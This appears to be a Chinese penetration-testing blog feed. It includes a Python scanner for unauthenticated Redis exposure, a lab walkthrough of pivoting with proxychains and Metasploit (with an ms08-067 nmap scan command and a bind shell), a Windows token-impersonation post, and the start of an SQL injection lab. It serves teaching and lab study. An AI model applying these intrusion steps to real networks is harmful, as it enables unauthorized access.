class="string">&#x27;\033[1;32;34msuccess\033[0m&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">            result.append(<span class="built_in">str</span>(ip) + <span class="string">&#x27;:&#x27;</span> + <span class="built_in">str</span>(port) + <span class="string">&#x27;:&#x27;</span> + <span class="string">&#x27;\033[1:31;34mfailed \033[0m&#x27;</span>)</span><br><span class="line">        s.close()</span><br><span class="line">    <span class="keyword">return</span>(result)</span><br></pre></td></tr></table></figure>
<p>然后针对该IP段进行网络主机检测。该部分代码主要以特殊字符”-“为目标进行分隔，将分隔后的字符进行for循环存入列表中，以便被<code>函数redis_unauthored</code>调用</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#执行URL</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">url_exec</span>(<span class="params">url</span>):</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    zi = []</span><br><span class="line">    group = []</span><br><span class="line">    group1 = []</span><br><span class="line">    group2 = []</span><br><span class="line">    li = url.split(<span class="string">&quot;.&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span>(url.find(<span class="string">&#x27;-&#x27;</span>)==-<span class="number">1</span>):</span><br><span class="line">        group.append(url)</span><br><span class="line">        zi = group</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> s <span class="keyword">in</span> li:</span><br><span class="line">            a = s.find(<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> a != -<span class="number">1</span>:</span><br><span class="line">                i = i+<span class="number">1</span></span><br><span class="line">        zi = url_list(li)</span><br><span class="line">        <span class="keyword">if</span> i &gt; <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">for</span> li <span class="keyword">in</span> zi:</span><br><span class="line">                zz = url_list(li.split(<span class="string">&quot;.&quot;</span>))</span><br><span class="line">                <span class="keyword">for</span> ki <span class="keyword">in</span> zz:</span><br><span class="line">                    group.append(ki)</span><br><span class="line">            zi = group</span><br><span class="line">            i = i-<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> i &gt; <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">for</span> li <span class="keyword">in</span> zi:</span><br><span class="line">                zzz = url_list(li.split(<span class="string">&quot;.&quot;</span>))</span><br><span class="line">                <span class="keyword">for</span> ki <span class="keyword">in</span> zzz:</span><br><span class="line">                    group1.append(ki)</span><br><span class="line">            zi = group1</span><br><span class="line">            i = i-<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> i &gt; <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">for</span> li <span class="keyword">in</span> zi:</span><br><span class="line">                zzzz = url_list(li.split(<span class="string">&quot;.&quot;</span>))</span><br><span class="line">                <span class="keyword">for</span> ki <span class="keyword">in</span> zzzz:</span><br><span class="line">                    group2.append(ki)</span><br><span class="line">            zi = group2</span><br><span class="line">    <span class="keyword">return</span> zi</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">url_list</span>(<span class="params">li</span>):</span></span><br><span class="line">    ss = []</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    zi = []</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> li:</span><br><span class="line">        a = s.find(<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">        i = i + <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> a != -<span class="number">1</span>:</span><br><span class="line">            ss = s.rsplit(<span class="string">&quot;-&quot;</span>)</span><br><span class="line">            j = i</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(ss[<span class="number">0</span>]), <span class="built_in">int</span>(ss[<span class="number">1</span>]) + <span class="number">1</span>):</span><br><span class="line">        li[j - <span class="number">1</span>] = <span class="built_in">str</span>(s)</span><br><span class="line">        aa = <span class="string">&quot;.&quot;</span>.join(li)</span><br><span class="line">        zi.append(aa)</span><br><span class="line">    <span class="keyword">return</span> zi</span><br></pre></td></tr></table></figure>
<p>最后是添加一些帮助信息和结果格式</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#使用规则</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">usage</span>():</span></span><br><span class="line">    print(<span class="string">&#x27;-h: --help 帮助;&#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;-p: --port 端口;&#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;-u: --url 域名;&#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;-s: --type Redis&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment">#输出结果格式设计</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">output_exec</span>(<span class="params">output,<span class="built_in">type</span></span>):</span></span><br><span class="line">    print(<span class="string">&quot;\033[1;32;40m&quot;</span>+<span class="built_in">type</span>+<span class="string">&quot;......\033[0m&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;++++++++++++++++++++++++++++++++++++++++++++++++&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;|         ip         |    port   |     status  |&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> li <span class="keyword">in</span> output:</span><br><span class="line">        print(<span class="string">&quot;+-----------------+-----------+--------------+&quot;</span>)</span><br><span class="line">        print(<span class="string">&quot;|   &quot;</span>+li.replace(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;   |    &quot;</span>)+<span class="string">&quot;  | &quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;+----------------+------------+---------------+\n&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;[*] shutting down....&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>最后设置一个漏洞回调函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#漏洞回调函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">launcher</span>(<span class="params">url,<span class="built_in">type</span>,port</span>):</span></span><br><span class="line">    <span class="comment">#未授权访问类型</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span> == <span class="string">&quot;Redis&quot;</span>:</span><br><span class="line">        output=redis_unauthored(url_exec(url),port)</span><br><span class="line">        output_exec(output,<span class="built_in">type</span>)</span><br></pre></td></tr></table></figure>
<p>附上完整代码以免疏漏</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> getopt</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="comment">#编写命令行参数处理功能</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start</span>(<span class="params">argv</span>):</span></span><br><span class="line">    <span class="built_in">dict</span> = &#123;&#125;</span><br><span class="line">    url = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="built_in">type</span> = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">        print(<span class="string">&quot;-h 帮助信息; \n&quot;</span>)</span><br><span class="line">        sys.exit()</span><br><span class="line">    <span class="comment">#定义异常处理</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        banner()</span><br><span class="line">        opts,args = getopt.getopt(argv, <span class="string">&quot;-u:-p:-s:-h&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> getopt.GetoptError:</span><br><span class="line">        print(<span class="string">&#x27;Error an argument!&#x27;</span>)</span><br><span class="line">        sys.exit()</span><br><span class="line">    <span class="keyword">for</span> opt,arg <span class="keyword">in</span> opts:</span><br><span class="line">        <span class="keyword">if</span> opt == <span class="string">&quot;-u&quot;</span>:</span><br><span class="line">            url = arg</span><br><span class="line">        <span class="keyword">elif</span> opt == <span class="string">&quot;-s&quot;</span>:</span><br><span class="line">            <span class="built_in">type</span> = arg</span><br><span class="line">        <span class="keyword">elif</span> opt == <span class="string">&quot;-p&quot;</span>:</span><br><span class="line">            port = arg</span><br><span class="line">        <span class="keyword">elif</span> opt == <span class="string">&quot;-h&quot;</span>:</span><br><span class="line">            print(usage())</span><br><span class="line">    launcher(url,<span class="built_in">type</span>,port)</span><br><span class="line"></span><br><span class="line"><span class="comment">#banner信息</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">banner</span>():</span></span><br><span class="line">    print(<span class="string">&#x27;\033[1;34m########################################################################################\033[0m\n&#x27;</span></span><br><span class="line">          <span class="string">&#x27;\033[1;34m######################################\033[1;32mRedis未授权访问漏洞\033[1;34m####################################\033[0m\n&#x27;</span></span><br><span class="line">          <span class="string">&#x27;\033[1;34m########################################################################################\033[0m\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#使用规则</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">usage</span>():</span></span><br><span class="line">    print(<span class="string">&#x27;-h: --help 帮助;&#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;-p: --port 端口;&#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;-u: --url 域名;&#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;-s: --type Redis&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#未授权函数检测</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redis_unauthored</span>(<span class="params">url,port</span>):</span></span><br><span class="line">    result = []</span><br><span class="line">    s = socket.socket()</span><br><span class="line">    payload = <span class="string">&quot;\x2a\x31\x0d\x0a\x24\x34\x0d\x0a\x69\x6e\x66\x6f\x0d\x0a&quot;</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">10</span>)</span><br><span class="line">    <span class="keyword">for</span> ip <span class="keyword">in</span> url:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            s.connect((ip, <span class="built_in">int</span>(port)))</span><br><span class="line">            s.sendall(payload.encode())</span><br><span class="line">            recvdata = s.recv(<span class="number">1024</span>).decode()</span><br><span class="line">            <span class="keyword">if</span> recvdata <span class="keyword">and</span> <span class="string">&#x27;redis_version&#x27;</span> <span class="keyword">in</span> recvdata:</span><br><span class="line">                result.append(<span class="built_in">str</span>(ip)+<span class="string">&#x27;:&#x27;</span>+<span class="built_in">str</span>(port)+<span class="string">&#x27;:&#x27;</span>+<span class="string">&#x27;\033[1;32;34msuccess\033[0m&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">            result.append(<span class="built_in">str</span>(ip) + <span class="string">&#x27;:&#x27;</span> + <span class="built_in">str</span>(port) + <span class="string">&#x27;:&#x27;</span> + <span class="string">&#x27;\033[1:31;34mfailed \033[0m&#x27;</span>)</span><br><span class="line">        s.close()</span><br><span class="line">    <span class="keyword">return</span>(result)</span><br><span class="line"></span><br><span class="line"><span class="comment">#执行URL</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">url_exec</span>(<span class="params">url</span>):</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    zi = []</span><br><span class="line">    group = []</span><br><span class="line">    group1 = []</span><br><span class="line">    group2 = []</span><br><span class="line">    li = url.split(<span class="string">&quot;.&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span>(url.find(<span class="string">&#x27;-&#x27;</span>)==-<span class="number">1</span>):</span><br><span class="line">        group.append(url)</span><br><span class="line">        zi = group</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> s <span class="keyword">in</span> li:</span><br><span class="line">            a = s.find(<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> a != -<span class="number">1</span>:</span><br><span class="line">                i = i+<span class="number">1</span></span><br><span class="line">        zi = url_list(li)</span><br><span class="line">        <span class="keyword">if</span> i &gt; <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">for</span> li <span class="keyword">in</span> zi:</span><br><span class="line">                zz = url_list(li.split(<span class="string">&quot;.&quot;</span>))</span><br><span class="line">                <span class="keyword">for</span> ki <span class="keyword">in</span> zz:</span><br><span class="line">                    group.append(ki)</span><br><span class="line">            zi = group</span><br><span class="line">            i = i-<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> i &gt; <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">for</span> li <span class="keyword">in</span> zi:</span><br><span class="line">                zzz = url_list(li.split(<span class="string">&quot;.&quot;</span>))</span><br><span class="line">                <span class="keyword">for</span> ki <span class="keyword">in</span> zzz:</span><br><span class="line">                    group1.append(ki)</span><br><span class="line">            zi = group1</span><br><span class="line">            i = i-<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> i &gt; <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">for</span> li <span class="keyword">in</span> zi:</span><br><span class="line">                zzzz = url_list(li.split(<span class="string">&quot;.&quot;</span>))</span><br><span class="line">                <span class="keyword">for</span> ki <span class="keyword">in</span> zzzz:</span><br><span class="line">                    group2.append(ki)</span><br><span class="line">            zi = group2</span><br><span class="line">    <span class="keyword">return</span> zi</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">url_list</span>(<span class="params">li</span>):</span></span><br><span class="line">    ss = []</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    zi = []</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> li:</span><br><span class="line">        a = s.find(<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">        i = i + <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> a != -<span class="number">1</span>:</span><br><span class="line">            ss = s.rsplit(<span class="string">&quot;-&quot;</span>)</span><br><span class="line">            j = i</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(ss[<span class="number">0</span>]), <span class="built_in">int</span>(ss[<span class="number">1</span>]) + <span class="number">1</span>):</span><br><span class="line">        li[j - <span class="number">1</span>] = <span class="built_in">str</span>(s)</span><br><span class="line">        aa = <span class="string">&quot;.&quot;</span>.join(li)</span><br><span class="line">        zi.append(aa)</span><br><span class="line">    <span class="keyword">return</span> zi</span><br><span class="line"></span><br><span class="line"><span class="comment">#输出结果格式设计</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">output_exec</span>(<span class="params">output,<span class="built_in">type</span></span>):</span></span><br><span class="line">    print(<span class="string">&quot;\033[1;32;40m&quot;</span>+<span class="built_in">type</span>+<span class="string">&quot;......\033[0m&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;++++++++++++++++++++++++++++++++++++++++++++++++&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;|         ip         |    port   |     status  |&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> li <span class="keyword">in</span> output:</span><br><span class="line">        print(<span class="string">&quot;+-----------------+-----------+--------------+&quot;</span>)</span><br><span class="line">        print(<span class="string">&quot;|   &quot;</span>+li.replace(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;   |    &quot;</span>)+<span class="string">&quot;  | &quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;+----------------+------------+---------------+\n&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;[*] shutting down....&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#漏洞回调函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">launcher</span>(<span class="params">url,<span class="built_in">type</span>,port</span>):</span></span><br><span class="line">    <span class="comment">#未授权访问类型</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span> == <span class="string">&quot;Redis&quot;</span>:</span><br><span class="line">        output=redis_unauthored(url_exec(url),port)</span><br><span class="line">        output_exec(output,<span class="built_in">type</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#程序起始部分</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        start(sys.argv[<span class="number">1</span>:])</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        print(<span class="string">&quot;interrupted by user, killing all threads...&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>实现效果如下图所示<br><img src="https://img-blog.csdnimg.cn/20210214220350642.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="防御策略"><a href="#防御策略" class="headerlink" title="防御策略"></a>防御策略</h2><ul>
<li><strong>禁止远程使用高危命令</strong></li>
<li><strong>低权限运行Redis服务</strong></li>
<li><strong>禁止外网访问Redis</strong></li>
<li><strong>阻止其他用户添加新的公钥，将authorized_keys的权限设置为对拥有者只读</strong></li>
</ul>
]]></content>
      <categories>
        <category>python安全攻防</category>
      </categories>
      <tags>
        <tag>漏洞检测与防御</tag>
      </tags>
  </entry>
  <entry>
    <title>proxychains代理扫描并获取内网服务器权限</title>
    <url>/2021/03/25/proxychains%E4%BB%A3%E7%90%86%E6%89%AB%E6%8F%8F%E5%B9%B6%E8%8E%B7%E5%8F%96%E5%86%85%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9D%83%E9%99%90/</url>
    <content><![CDATA[<h2 id="Proxychains"><a href="#Proxychains" class="headerlink" title="Proxychains"></a>Proxychains</h2><p>Proxychains是为了GNU\Linux操作系统而开发的工具，任何TCP连接都可以通过TOR或者SOCKS4，SOCKS5，HTTP/HTTPS路由到目的地。在这个通道技术中可以使用多个代理服务器。除此之外提供匿名方式，诸如用于中转跳板的应用程序也可以用于对发现的新网络进行直接通信。</p>
<h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>还是这个拓扑图，我们穿越了层层障碍，终于拿到了<code>192.168.103.101</code>这台服务器的权限，接下来，我们以这台服务器为跳板机，去访问内网中的更多机器。而proxychains则是隐藏我们本机kali对目标服务器之间的流量，从而加大被溯源的成本。在真实的渗透中可能不止一台数据库机器，横向的时候可能会出现多台域主机。<br><img src="https://img-blog.csdnimg.cn/20210325101439326.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h2><p>首先我们先拿下win7这台主机的权限，我们使用上次生成的木马进行连接shell</p>
<span id="more"></span>
<p><img src="https://img-blog.csdnimg.cn/20210325102402822.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210325102521265.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后我们先打印一下路由表信息，发现啥也没有<br><img src="https://img-blog.csdnimg.cn/20210325102734146.png" alt="在这里插入图片描述"><br>运行脚本文件，自动将搜集到的网段加入到自动路由表中，这步很重要，将直接影响到后期proxychains执行的效果<br><img src="https://img-blog.csdnimg.cn/20210325102915321.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>接下来我们将使用大名鼎鼎的<code>socks4a</code>模块，在后台开启一个代理服务<br><img src="https://img-blog.csdnimg.cn/20210325103248514.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<!--more-->
<p>在上述工作全部顺利完成后，我们就要去配置我们的proxychains配置文件了，路径为<code>/etc/proxychains.conf</code><br><img src="https://img-blog.csdnimg.cn/20210325103548413.png" alt="在这里插入图片描述"><br>保存退出后，我们将使用proxychains加nmap进行主机的漏洞扫描，这里因为我查过文章知道，windows server2003存在缓冲区溢出这个漏洞，因此我直接针对这个漏洞展开扫描，执行的扫描命令为<code>proxychains nmap -sT -sV -Pn -n -p22,135,139,445 --script=smb-vuln-ms08-067.nse 192.168.104.128</code>，最后的IP地址为横向后的主机IP</p>
<p><img src="https://img-blog.csdnimg.cn/20210325104557700.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210325104629217.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>当我们判断出系统确实存在这个漏洞之后，我们就返回msf对这个漏洞进行进一步的利用，这里强调一点就是，我们不能再使用反弹shell的payload了，因为我们的主机能访问目标机，但是目标机不能访问我们的本机，所以这里要设置一个直连shell的payload<br><img src="https://img-blog.csdnimg.cn/20210325105533753.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>至此，我们又拿下了内网中的另一台机器(假如是数据库)<br><img src="https://img-blog.csdnimg.cn/20210325110028851.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><p>为了验证我们的流量还有真实IP是否得到真实的隐藏，我们中间再插入一台新的主机，里面使用wireshark对流量数据包进行监听，网段设置一定要和内网数据库主机(<code>104</code>网段)的主机一致。<br><img src="https://img-blog.csdnimg.cn/20210325110645479.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后我们在win7的那个meterpreter上执行arp扫描，在上面一台主机上观察数据包的流量变化<br><img src="https://img-blog.csdnimg.cn/20210325111454791.png" alt="在这里插入图片描述"><br>可以看到，都是win7和win2003主机之间的通信，我们真实的主机IP得到了很好的隐藏<br><img src="https://img-blog.csdnimg.cn/20210325111539446.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>红蓝对抗</tag>
      </tags>
  </entry>
  <entry>
    <title>令牌假冒</title>
    <url>/2021/03/21/%E4%BB%A4%E7%89%8C%E5%81%87%E5%86%92/</url>
    <content><![CDATA[<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>假冒令牌可以假冒一个网络中的另一个用户进行各种操作。令牌包括登录会话的安全信息，如用户身份识别、用户组合用户权限。当一个用户登录Windows系统时，它被给定一个访问令牌作为它认证会话的一部分。例如，一个入侵用户可能需要以域管理员处理一个特定任务，当它使用令牌便可假冒域管理员进行工作。</p>
<h2 id="Windows安全相关概念"><a href="#Windows安全相关概念" class="headerlink" title="Windows安全相关概念"></a>Windows安全相关概念</h2><ul>
<li>Session</li>
<li>Windows Station</li>
<li>Desktop</li>
<li>Login Session：不同账号登录产生不同的登录Session，代表不同的账号权限</li>
</ul>
<h2 id="Tokens"><a href="#Tokens" class="headerlink" title="Tokens"></a>Tokens</h2><ul>
<li>Tokens与进程相关联，进程创建时根据Login Session分配对应Token，含有该进程用户账号、组信息、权限信息等。</li>
<li>用户每次登录，产生Login Session分配对应Token</li>
<li>访问资源时提交Token进行身份验证，类似于Web Cookie</li>
<li>Delegate Token：交互登录会话</li>
<li>Impersonate Token：非交互登录会话<span id="more"></span>
<h2 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h2>首先我们得构造一个域环境，这里我已经搭建完成了，不懂的小伙伴请自行百度。然后我们关闭Windows XP的防火墙，利用经典的缓冲区溢出漏洞<code>MS08_067</code>漏洞获取shell。<br><img src="https://img-blog.csdnimg.cn/20210319230852823.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><!--more-->
加载<code>Incognito</code>模块，重要的是<code>impersonate_token</code>和<code>list_tokens</code>这两个模块，前者是伪造域管理员或者更高权限的令牌，后者是列出当前计算机都有哪些计算机访问过留下的token值<br><img src="https://img-blog.csdnimg.cn/20210319231232492.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2021031923145549.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>我们尝试使用域控用共享的方式访问XP主机的C盘<br><img src="https://img-blog.csdnimg.cn/20210319231602521.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>成功捕获到域管理员的令牌<br><img src="https://img-blog.csdnimg.cn/20210319231704464.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后使用<code>impersonate_token</code>命令假冒域管理员，因为单斜杠会被转义，所以要换成双斜杠，可以看到我们当前的权限变为域管理员权限<br><img src="https://img-blog.csdnimg.cn/20210319231835906.png" alt="在这里插入图片描述"><br>然后我们就能进入shell执行各种恶意操作了<br><img src="https://img-blog.csdnimg.cn/20210319232030942.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
</ul>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>红蓝对抗</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL报错注入实战</title>
    <url>/2021/03/25/%E4%B8%80%E6%AC%A1SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%88%98/</url>
    <content><![CDATA[<h2 id="手工注入过程"><a href="#手工注入过程" class="headerlink" title="手工注入过程"></a>手工注入过程</h2><ol>
<li>首先我们拿到一个靶机网站，随便输入一个密码，无任何回显，然后我们进行抓包判断，查看源代码发现加入tips参数能出报错提示<br><img src="https://img-blog.csdnimg.cn/20210325162455485.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210325162503191.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
<li>可初步判断可以使用SQL报错注入进行注入攻击，然后我们对name变量进行插入恶意语句<br><img src="https://img-blog.csdnimg.cn/20210325162519249.png" alt="在这里插入图片描述"><span id="more"></span></li>
<li>发现我们的select关键词被WAF过滤了<br><img src="https://img-blog.csdnimg.cn/20210325162548472.png" alt="在这里插入图片描述"></li>
